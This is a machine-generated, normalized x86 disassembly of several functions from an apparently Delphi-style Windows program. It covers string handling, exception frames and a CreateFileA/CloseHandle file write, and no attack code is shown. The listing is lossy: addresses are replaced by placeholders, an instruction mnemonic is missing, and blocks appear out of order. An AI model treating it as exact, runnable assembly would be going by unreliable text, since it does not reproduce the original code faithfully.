mov eax [ ebp - 0xb0 ]
call sub_4d2758
dec [ ebp - 0x60 ]
dec [ ebp - 0x60 ]
lea eax [ ebp - 0x58 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x60 ]
lea eax [ ebp - 0x54 ]
mov edx 0x2
call sub_4d318c
mov [ ebx + 0x4 ] esi
mov edx esi
mov eax [ rw-data ]
mov ecx [ eax ]
mov eax [ ecx + 0x44c ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov edx [ rw-data ]
mov eax [ edx ]
call sub_40a44c
mov edx [ rw-data ]
mov eax [ edx ]
call sub_409ba0
mov dl [ ebp + 0x10 ]
test dl dl
jne r-xdata
mov [ ebp - 0x6c ] 0x78
xor ecx ecx
mov [ ebp - 0xac ] ecx
lea edx [ ebp - 0x48 ]
lea eax [ ebp - 0x50 ]
call sub_4d3050
inc [ ebp - 0x60 ]
mov ecx [ ebp - 0xac ]
mov [ ebp - 0x4c ] ecx
lea eax [ ebp - 0x50 ]
inc [ ebp - 0x60 ]
push eax
add esp 0xfffffff0
mov edx [ ebp - 0x110 ]
mov [ esp ] edx
mov edx [ ebp - 0x10c ]
mov [ esp + 0x4 ] edx
mov ecx [ ebp - 0x108 ]
mov [ esp + 0x8 ] ecx
mov eax [ ebp - 0x98 ]
push eax
lea edx [ ebp - 0x130 ]
push edx
call sub_4124cc
add esp 0x1c
lea edi [ ebp - 0x110 ]
mov ecx 0x4
lea eax [ ebp - 0x50 ]
push esi
lea esi [ ebp - 0x130 ]
[ edi ] [ esi ]
pop esi
mov edx 0x2
dec [ ebp - 0x60 ]
dec [ ebp - 0x60 ]
call sub_4d318c
mov [ ebp - 0x6c ] 0x6c
mov edx [ ebp - 0x108 ]
mov [ ebp - 0xa4 ] edx
mov ecx [ ebp - 0xa4 ]
add ecx 0xc
mov [ ebp - 0xa8 ] ecx
lea eax [ ebp - 0x48 ]
mov edx [ ebp - 0xa8 ]
call sub_4d327c
test al al
je r-xdata
mov [ ebx + 0x8 ] ecx
xor eax eax
mov [ ebp - 0x6c ] 0x60
mov [ ebp - 0x34 ] eax
lea ecx [ ebp - 0x34 ]
inc [ ebp - 0x60 ]
mov edx esi
mov eax [ ebx ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebp - 0x34 ]
lea eax [ ebp - 0x38 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x60 ]
inc [ ebp - 0x60 ]
lea edx [ ebp - 0x38 ]
xor eax eax
mov [ ebp - 0x3c ] eax
inc [ ebp - 0x60 ]
lea ecx [ ebp - 0x3c ]
inc [ ebp - 0x60 ]
mov eax [ rw-data ]
add eax 0x4
call sub_402e08
lea edx [ ebp - 0x3c ]
lea eax [ ebp - 0x40 ]
push edx
mov edx rw-data
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x60 ]
inc [ ebp - 0x60 ]
xor eax eax
mov [ ebp - 0x44 ] eax
lea edx [ ebp - 0x40 ]
inc [ ebp - 0x60 ]
inc [ ebp - 0x60 ]
lea ecx [ ebp - 0x44 ]
pop eax
call sub_402e08
lea edx [ ebp - 0x44 ]
mov ecx [ edx ]
push ecx
mov eax [ ebx + 0x8 ]
push eax
call sub_40fc08
add esp 0x8
dec [ ebp - 0x60 ]
dec [ ebp - 0x60 ]
lea eax [ ebp - 0x44 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x60 ]
dec [ ebp - 0x60 ]
lea eax [ ebp - 0x40 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x60 ]
dec [ ebp - 0x60 ]
lea eax [ ebp - 0x3c ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x60 ]
dec [ ebp - 0x60 ]
lea eax [ ebp - 0x38 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x60 ]
lea eax [ ebp - 0x34 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x6c ] 0x6c
xor ecx ecx
mov [ ebp - 0x48 ] ecx
lea ecx [ ebp - 0x48 ]
inc [ ebp - 0x60 ]
mov edx esi
mov eax [ ebx ]
mov edi [ eax ]
call [ edi + 0xc ]
lea eax [ ebx + 0x10 ]
lea edx [ ebp - 0x48 ]
mov [ ebp - 0x98 ] eax
push edx
mov ecx [ ebp - 0x98 ]
push ecx
call sub_412480
add esp 0x8
mov [ ebp - 0x9c ] eax
mov eax [ ebp - 0x9c ]
mov [ ebp - 0x108 ] eax
mov edx [ ebp - 0x98 ]
mov ecx [ edx + 0x28 ]
mov [ ebp - 0xa0 ] ecx
mov eax [ ebp - 0xa0 ]
mov [ ebp - 0x118 ] eax
mov edx [ ebp - 0x118 ]
mov ecx [ ebp - 0x108 ]
cmp edx ecx
sete al
and eax 0x1
test al al
jne r-xdata
call sub_40e96c
xor eax eax
mov edx [ ebp - 0x7c ]
mov [ fs : 0x0 ] edx
mov [ ebx + 0x40 ] esi
mov ecx [ ebp - 0x108 ]
mov eax [ ebx + 0x8 ]
add ecx 0x10
mov edx 0x2
mov [ ecx ] eax
lea eax [ ebp - 0x48 ]
dec [ ebp - 0x60 ]
call sub_4d318c
sub_4132d0
push ebp
mov ebp esp
add esp 0xffffffc8
mov eax rw-data
push ebx
push esi
mov ebx [ ebp + 0x8 ]
call sub_4c517c
mov [ ebp - 0x1c ] 0x1
lea edx [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
call sub_4d3050
inc [ ebp - 0x1c ]
lea edx [ ebp + 0xc ]
mov [ ebp - 0x28 ] 0xc
mov [ ebp - 0x28 ] 0x18
lea eax [ ebp - 0x4 ]
call sub_4d3050
inc [ ebp - 0x1c ]
mov edx [ eax ]
mov eax [ ebx ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov esi eax
dec [ ebp - 0x1c ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x28 ] 0xc
test esi esi
jge r-xdata
push 0x0
push esi
push ebx
call sub_412c58
add esp 0xc
mov edx 0x2
push eax
lea eax [ ebp + 0xc ]
dec [ ebp - 0x1c ]
call sub_4d318c
pop eax
mov edx [ ebp - 0x38 ]
mov [ fs : 0x0 ] edx
mov [ ebp - 0x28 ] 0x24
xor ecx ecx
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x8 ]
inc [ ebp - 0x1c ]
lea edx [ ebp + 0xc ]
mov eax rw-data
call sub_4d3600
lea eax [ ebp - 0x8 ]
push eax
mov edx rw-data
lea eax [ ebp - 0xc ]
call sub_4d3010
inc [ ebp - 0x1c ]
xor ecx ecx
mov [ ebp - 0x10 ] ecx
lea ecx [ ebp - 0x10 ]
inc [ ebp - 0x1c ]
lea edx [ ebp - 0xc ]
pop eax
call sub_4d31c8
lea edx [ ebp - 0x10 ]
lea eax [ ebp - 0x14 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x1c ]
lea edx [ ebp - 0x14 ]
inc [ ebp - 0x1c ]
mov eax [ edx ]
push eax
push rw-data
push 0x93
push rw-data
push rw-data
call sub_41c1fc
add esp 0x14
dec [ ebp - 0x1c ]
dec [ ebp - 0x1c ]
lea eax [ ebp - 0x14 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x1c ]
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x1c ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x1c ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
mov eax 0x1
mov edx 0x2
push eax
lea eax [ ebp + 0xc ]
dec [ ebp - 0x1c ]
call sub_4d318c
pop eax
mov edx [ ebp - 0x38 ]
mov [ fs : 0x0 ] edx
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41344c
push ebp
mov ebp esp
add esp 0xffffffcc
mov eax rw-data
push ebx
push esi
push edi
call sub_4c517c
movsx ebx [ ebp + 0xc ]
push ebx
call sub_4cbfa0
pop ecx
mov [ ebp + 0xc ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x34 ] 0xffffffff
xor ebx ebx
mov eax [ ebp - 0x30 ]
cmp ebx eax
jge r-xdata
mov eax [ ebp - 0x34 ]
test eax eax
jge r-xdata
mov [ ebp - 0x1c ] 0x18
xor edx edx
mov [ ebp - 0x8 ] edx
lea ecx [ ebp - 0x8 ]
inc [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0xc ]
lea edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x10 ]
inc [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x1c ] 0xc
mov ecx [ ebp - 0x4 ]
test ecx ecx
jne r-xdata
push 0x0
mov ecx [ ebp - 0x34 ]
push ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_412c58
add esp 0xc
mov edx [ ebp - 0x2c ]
mov [ fs : 0x0 ] edx
or eax 0xffffffff
mov edx [ ebp - 0x2c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
mov eax rw-data
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
movzx eax [ esi - 0xa ]
cmp eax 0x2
jne r-xdata
mov esi eax
movsx edx [ esi ]
push edx
call sub_4ca214
pop ecx
test eax eax
je r-xdata
dec [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
mov [ ebp - 0x1c ] 0x0
inc ebx
mov ecx [ ebp - 0x30 ]
cmp ebx ecx
jl r-xdata
movsx edi [ esi ]
push edi
call sub_4cbfa0
pop ecx
movsx edx [ ebp + 0xc ]
cmp eax edx
jne r-xdata
lea eax [ ebp - 0x4 ]
call j_sub_44a5d8#2
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_41e5d8
movsx eax [ esi + 0x1 ]
push eax
call sub_4ca214
pop ecx
test eax eax
jne r-xdata
mov ecx [ ebp - 0x34 ]
test ecx ecx
jge r-xdata
mov [ ebp - 0x34 ] ebx
dec [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
jmp r-xdata
mov [ ebp - 0x34 ] ebx
sub_4135b4
push ebp
mov ebp esp
add esp 0xffffffc0
mov eax rw-data
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
call sub_4c517c
mov esi [ ebx + 0x8 ]
mov al [ esi ]
test al al
je r-xdata
mov [ ebp - 0x30 ] 0x18
xor ecx ecx
mov edx rw-data
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x1c ]
inc [ ebp - 0x24 ]
mov [ ebp - 0x30 ] 0x24
mov [ ebp - 0x30 ] 0x30
call sub_4d3010
inc [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
lea eax [ ebp - 0x4 ]
call sub_4d31b4
dec [ ebp - 0x24 ]
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_4d318c
push 0x0
mov ecx [ ebp - 0x4 ]
push ecx
push ebx
call sub_413928
add esp 0xc
mov edx 0x2
push eax
lea eax [ ebp - 0x4 ]
dec [ ebp - 0x24 ]
call sub_4d318c
pop eax
mov edx [ ebp - 0x40 ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x30 ] 0xc
xor edx edx
mov [ ebp - 0x8 ] edx
lea ecx [ ebp - 0x8 ]
inc [ ebp - 0x24 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebp - 0x8 ]
lea eax [ ebp - 0xc ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x24 ]
inc [ ebp - 0x24 ]
lea edx [ ebp - 0xc ]
xor eax eax
mov [ ebp - 0x10 ] eax
inc [ ebp - 0x24 ]
lea ecx [ ebp - 0x10 ]
inc [ ebp - 0x24 ]
mov eax [ rw-data ]
add eax 0x4
call sub_402e08
lea edx [ ebp - 0x10 ]
lea eax [ ebp - 0x14 ]
push edx
mov edx rw-data
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x24 ]
inc [ ebp - 0x24 ]
xor eax eax
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x14 ]
inc [ ebp - 0x24 ]
inc [ ebp - 0x24 ]
lea ecx [ ebp - 0x18 ]
pop eax
call sub_402e08
lea edx [ ebp - 0x18 ]
mov ecx [ edx ]
push ecx
push esi
call sub_410ee8
add esp 0x8
dec [ ebp - 0x24 ]
dec [ ebp - 0x24 ]
lea eax [ ebp - 0x18 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x24 ]
dec [ ebp - 0x24 ]
lea eax [ ebp - 0x14 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x24 ]
dec [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x24 ]
dec [ ebp - 0x24 ]
lea eax [ ebp - 0xc ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x24 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
sub_41372c
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov eax rw-data
call sub_4c517c
mov edx [ ebx + 0x8 ]
mov cl [ edx ]
test cl cl
je r-xdata
mov [ ebp - 0x3c ] 0x24
xor ecx ecx
mov [ ebp - 0x4 ] ecx
lea ecx [ ebp - 0x4 ]
inc [ ebp - 0x30 ]
mov edx esi
mov eax [ ebx ]
mov esi [ eax ]
call [ esi + 0xc ]
mov [ ebp - 0x3c ] 0x18
mov [ ebp - 0x3c ] 0x30
xor eax eax
xor edx edx
mov [ ebp - 0x8 ] eax
mov eax rw-data
inc [ ebp - 0x30 ]
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x3c ] 0x18
mov [ ebp - 0x3c ] 0x3c
mov [ ebp - 0x20 ] edx
lea edx [ ebp - 0x4 ]
inc [ ebp - 0x30 ]
call sub_4d3564
lea ecx [ ebp - 0x20 ]
push ecx
mov edx rw-data
lea eax [ ebp - 0x24 ]
call sub_4d3010
inc [ ebp - 0x30 ]
xor eax eax
mov [ ebp - 0x28 ] eax
lea edx [ ebp - 0x24 ]
inc [ ebp - 0x30 ]
lea ecx [ ebp - 0x28 ]
pop eax
call sub_4d31c8
lea edx [ ebp - 0x28 ]
lea eax [ ebp - 0x8 ]
call sub_4d31b4
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x24 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_4d318c
push 0x1
mov ecx [ ebp - 0x8 ]
push ecx
push ebx
call sub_413928
add esp 0xc
mov edx 0x2
push eax
lea eax [ ebp - 0x8 ]
dec [ ebp - 0x30 ]
call sub_4d318c
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
pop eax
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x3c ] 0xc
xor eax eax
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0xc ]
inc [ ebp - 0x30 ]
mov edx esi
mov eax [ ebx ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x10 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x30 ]
inc [ ebp - 0x30 ]
lea edx [ ebp - 0x10 ]
xor eax eax
mov [ ebp - 0x14 ] eax
inc [ ebp - 0x30 ]
lea ecx [ ebp - 0x14 ]
inc [ ebp - 0x30 ]
mov eax [ rw-data ]
add eax 0x4
call sub_402e08
lea edx [ ebp - 0x14 ]
lea eax [ ebp - 0x18 ]
push edx
mov edx rw-data
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x30 ]
inc [ ebp - 0x30 ]
xor eax eax
mov [ ebp - 0x1c ] eax
lea edx [ ebp - 0x18 ]
inc [ ebp - 0x30 ]
inc [ ebp - 0x30 ]
lea ecx [ ebp - 0x1c ]
pop eax
call sub_402e08
lea edx [ ebp - 0x1c ]
mov ecx [ edx ]
push ecx
mov eax [ ebx + 0x8 ]
push eax
call sub_410ee8
add esp 0x8
dec [ ebp - 0x30 ]
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x1c ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x30 ]
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x18 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x30 ]
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x14 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x30 ]
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x10 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x30 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
sub_413928
push ebp
mov ebp esp
add esp 0xfffffebc
mov eax rw-data
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
call sub_4c517c
mov [ ebp - 0x84 ] 0x1
lea edx [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
call sub_4d3050
inc [ ebp - 0x84 ]
mov edx [ rw-data ]
mov [ ebp - 0x90 ] 0xc
mov [ ebp - 0x90 ] 0x18
mov ecx [ edx ]
mov dl 0x1
mov eax [ rw-data ]
call sub_41c420
mov [ ebp - 0x8 ] eax
inc [ ebp - 0x84 ]
mov [ ebp - 0x90 ] 0xc
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_48dfa0
mov [ ebp - 0x90 ] 0x24
mov edx rw-data
lea eax [ ebp - 0x18 ]
call sub_4d3010
inc [ ebp - 0x84 ]
mov edx [ eax ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x37c ]
call sub_48dfa0
dec [ ebp - 0x84 ]
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x90 ] 0x30
xor ecx ecx
mov [ ebp - 0x14 ] ecx
inc [ ebp - 0x84 ]
mov [ ebp - 0x90 ] 0xc
mov [ ebp - 0xa1 ] 0x0
xor ebx ebx
jmp r-xdata
xor eax eax
mov edx 0x2
push eax
lea eax [ ebp - 0x14 ]
dec [ ebp - 0x84 ]
call sub_4d318c
dec [ ebp - 0x84 ]
mov ecx [ ebp - 0x8 ]
test ecx ecx
je r-xdata
mov eax [ esi ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jl r-xdata
mov [ ebp - 0x90 ] 0x54
dec [ ebp - 0x84 ]
lea eax [ ebp + 0xc ]
mov edx 0x2
call sub_4d318c
pop eax
mov edx [ ebp - 0xa0 ]
mov [ fs : 0x0 ] edx
jmp r-xdata
mov ebx [ ebp - 0x8 ]
mov esi ebx
mov [ ebp - 0x28 ] esi
test esi esi
je r-xdata
mov [ ebp - 0x90 ] 0x84
xor eax eax
mov [ ebp - 0x2c ] eax
lea ecx [ ebp - 0x2c ]
inc [ ebp - 0x84 ]
mov eax [ esi ]
mov edx ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x2c ]
test eax eax
je r-xdata
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x28 ]
mov edx [ eax ]
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x90 ] 0x78
mov edx 0x3
mov eax [ ebp - 0x28 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov [ ebp - 0x90 ] 0x60
mov edx rw-data
mov edx [ ebp - 0x2c ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x100 ]
mov [ ebp - 0x90 ] 0x3c
xor ecx ecx
mov [ ebp - 0x1c ] ecx
lea edx [ ebp - 0x1c ]
inc [ ebp - 0x84 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x37c ]
call sub_48df68
lea edx [ ebp - 0x1c ]
lea eax [ ebp - 0x14 ]
call sub_4d31b4
dec [ ebp - 0x84 ]
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x90 ] 0x48
mov edx rw-data
lea eax [ ebp - 0x20 ]
call sub_4d3010
inc [ ebp - 0x84 ]
lea edx [ ebp - 0x20 ]
lea eax [ ebp - 0x14 ]
call sub_4d324c
push eax
dec [ ebp - 0x84 ]
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_4d318c
pop ecx
test cl cl
je r-xdata
push 0x0
push 0x0
push 0x2
push 0x0
push 0x0
push 0x40000000
mov [ ebp - 0x90 ] 0xd8
mov edx rw-data
lea eax [ ebp - 0x4c ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x84 ]
inc [ ebp - 0x84 ]
lea eax [ ebp - 0x4c ]
push eax
lea edx [ ebp - 0x14 ]
lea eax [ ebp - 0x44 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x84 ]
inc [ ebp - 0x84 ]
lea edx [ ebp - 0x44 ]
xor eax eax
mov [ ebp - 0x48 ] eax
inc [ ebp - 0x84 ]
lea ecx [ ebp - 0x48 ]
inc [ ebp - 0x84 ]
mov eax [ rw-data ]
add eax 0x4
call sub_402e08
lea eax [ ebp - 0x48 ]
xor edx edx
mov [ ebp - 0x50 ] edx
inc [ ebp - 0x84 ]
lea ecx [ ebp - 0x50 ]
inc [ ebp - 0x84 ]
pop edx
call sub_402e08
mov eax [ ebp - 0x50 ]
test eax eax
jne r-xdata
inc ebx
mov [ ebp - 0xa1 ] 0x1
push 0x3
mov edx rw-data
mov [ ebp - 0x90 ] 0x9c
lea eax [ ebp - 0x34 ]
call sub_4d3128
inc [ ebp - 0x84 ]
xor eax eax
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x14 ]
inc [ ebp - 0x84 ]
lea edx [ ebp - 0x34 ]
lea ecx [ ebp - 0x38 ]
call sub_4d31c8
mov edx [ ebp - 0x38 ]
test edx edx
je r-xdata
lea eax [ ebp - 0x30 ]
call sub_4d3128
inc [ ebp - 0x84 ]
lea edx [ ebp - 0x30 ]
lea eax [ ebp - 0x14 ]
call sub_4d3288
test eax eax
lea eax [ ebp - 0x30 ]
sete cl
and ecx 0x1
mov edx 0x2
push ecx
dec [ ebp - 0x84 ]
call sub_4d318c
dec [ ebp - 0x84 ]
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_4d318c
pop ecx
test cl cl
je r-xdata
mov ebx [ ebp - 0x50 ]
test ebx ebx
je r-xdata
mov ecx rw-data
jmp r-xdata
mov edx rw-data
mov edx [ ebp - 0x38 ]
jmp r-xdata
mov ecx [ ebp - 0x50 ]
movzx eax [ ebx - 0xa ]
cmp eax 0x2
jne r-xdata
push ecx
call CreateFileA
mov ebx eax
dec [ ebp - 0x84 ]
dec [ ebp - 0x84 ]
lea eax [ ebp - 0x50 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x84 ]
dec [ ebp - 0x84 ]
lea eax [ ebp - 0x4c ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x84 ]
dec [ ebp - 0x84 ]
lea eax [ ebp - 0x48 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x84 ]
dec [ ebp - 0x84 ]
lea eax [ ebp - 0x44 ]
xor edx edx
call sub_4d2728
cmp ebx 0xffffffff
jne r-xdata
cmp edi 0x7
jne r-xdata
xor eax eax
mov edx 0x2
push eax
lea eax [ ebp - 0x14 ]
dec [ ebp - 0x84 ]
call sub_4d318c
dec [ ebp - 0x84 ]
mov ecx [ ebp - 0x8 ]
test ecx ecx
je r-xdata
mov ecx rw-data
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4826f8
mov edi eax
dec [ ebp - 0x84 ]
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x84 ]
lea eax [ ebp - 0x34 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x90 ] 0x90
cmp edi 0x2
jne r-xdata
push ebx
call CloseHandle
jmp r-xdata
push 0x10
mov edx rw-data
mov [ ebp - 0x90 ] 0xe4
lea eax [ ebp - 0x54 ]
call sub_4d3128
inc [ ebp - 0x84 ]
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x14 ]
inc [ ebp - 0x84 ]
lea edx [ ebp - 0x54 ]
lea ecx [ ebp - 0x58 ]
call sub_4d31c8
mov edx [ ebp - 0x58 ]
test edx edx
je r-xdata
lea eax [ ebp - 0x50 ]
call j_sub_44a5d8#2
lea edx [ ebp - 0x50 ]
lea eax [ ebp - 0x50 ]
call sub_41e5d8
mov [ ebp - 0x90 ] 0xc
or ebx 0xffffffff
jmp r-xdata
mov [ ebp - 0x90 ] 0xa8
dec [ ebp - 0x84 ]
lea eax [ ebp + 0xc ]
mov edx 0x2
call sub_4d318c
pop eax
mov edx [ ebp - 0xa0 ]
mov [ fs : 0x0 ] edx
jmp r-xdata
mov ebx [ ebp - 0x8 ]
mov esi ebx
mov [ ebp - 0x40 ] esi
test esi esi
je r-xdata
mov ecx [ esi + 0x8 ]
mov [ ebp - 0xa8 ] ecx
mov [ ebp - 0x90 ] 0xc
mov al [ ebp + 0x10 ]
test al al
je r-xdata
mov edx rw-data
mov edx [ ebp - 0x58 ]
jmp r-xdata
mov eax [ ebp - 0x40 ]
mov edx [ eax ]
mov [ ebp - 0x3c ] edx
mov [ ebp - 0x90 ] 0xcc
mov edx 0x3
mov eax [ ebp - 0x40 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov [ ebp - 0x90 ] 0xb4
push 0x1a91c
call sub_4bbbac
pop ecx
mov [ ebp - 0x60 ] eax
test eax eax
je r-xdata
push 0x1a91c
call sub_4bbbac
pop ecx
mov [ ebp - 0x5c ] eax
test eax eax
je r-xdata
mov ecx rw-data
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4826f8
dec [ ebp - 0x84 ]
lea eax [ ebp - 0x58 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x84 ]
lea eax [ ebp - 0x54 ]
mov edx 0x2
call sub_4d318c
jmp r-xdata
mov eax [ ebp - 0x60 ]
mov [ ebp - 0x90 ] 0x12c
mov ecx [ ebp - 0x60 ]
push ecx
call sub_40f9e0
pop ecx
mov [ ebp - 0x90 ] 0x114
mov eax [ ebp - 0x60 ]
jmp r-xdata
mov edx [ ebp - 0x5c ]
mov [ ebp - 0x90 ] 0x108
mov ebx [ ebp - 0xa8 ]
mov ecx [ ebp - 0x5c ]
mov dl [ ebx ]
mov [ ecx ] dl
lea ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x5c ]
mov eax [ ebx + 0x4 ]
mov [ edx + 0x4 ] eax
push sub_414360
push 0x1
push 0x10
push 0x1a90
push ecx
mov eax [ ebp - 0x5c ]
add eax 0x8
push eax
call sub_4c3bc4
mov ecx [ ebp - 0x5c ]
mov edx [ ebx + 0x1a908 ]
add esp 0x18
mov [ ecx + 0x1a908 ] edx
mov edx [ ebp - 0x5c ]
mov al [ ebx + 0x1a90c ]
mov [ edx + 0x1a90c ] al
mov eax [ ebp - 0x5c ]
mov cl [ ebx + 0x1a90d ]
mov [ eax + 0x1a90d ] cl
mov ecx [ ebp - 0x5c ]
mov edx [ ebx + 0x1a910 ]
mov [ ecx + 0x1a910 ] edx
mov edx [ ebp - 0x5c ]
mov eax [ ebx + 0x1a914 ]
mov [ edx + 0x1a914 ] eax
mov eax [ ebp - 0x5c ]
mov ecx [ ebx + 0x1a918 ]
mov [ eax + 0x1a918 ] ecx
add [ ebp - 0x84 ] 0xfffff330
mov [ ebp - 0x90 ] 0xf0
mov edx [ ebp - 0x5c ]
jmp r-xdata
mov eax [ esi ]
mov edx [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
lea ebx [ esi + 0x10 ]
lea eax [ ebp - 0x14 ]
push eax
push ebx
call sub_412480
add esp 0x8
mov [ ebp - 0xac ] eax
mov edx [ ebp - 0xac ]
mov [ ebp - 0xec ] edx
mov ecx [ ebx + 0x28 ]
mov [ ebp - 0xb4 ] ecx
mov eax [ ebp - 0xb4 ]
mov [ ebp - 0xfc ] eax
mov edx [ ebp - 0xfc ]
mov ecx [ ebp - 0xec ]
cmp edx ecx
sete al
and eax 0x1
test al al
jne r-xdata
mov [ esi + 0x8 ] eax
mov edx [ esi + 0x8 ]
push edx
call sub_40fb50
pop ecx
mov cl [ ebp - 0xa1 ]
test cl cl
je r-xdata
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ ebp - 0x90 ] 0x168
xor ecx ecx
mov [ ebp - 0xd0 ] ecx
lea edx [ ebp - 0x14 ]
lea eax [ ebp - 0x6c ]
call sub_4d3050
inc [ ebp - 0x84 ]
lea eax [ ebp - 0x6c ]
mov ecx [ ebp - 0xd0 ]
mov [ ebp - 0x68 ] ecx
inc [ ebp - 0x84 ]
push eax
add esp 0xfffffff0
mov edx [ ebp - 0x124 ]
lea eax [ ebp - 0x144 ]
mov [ esp ] edx
mov edx [ ebp - 0x120 ]
mov [ esp + 0x4 ] edx
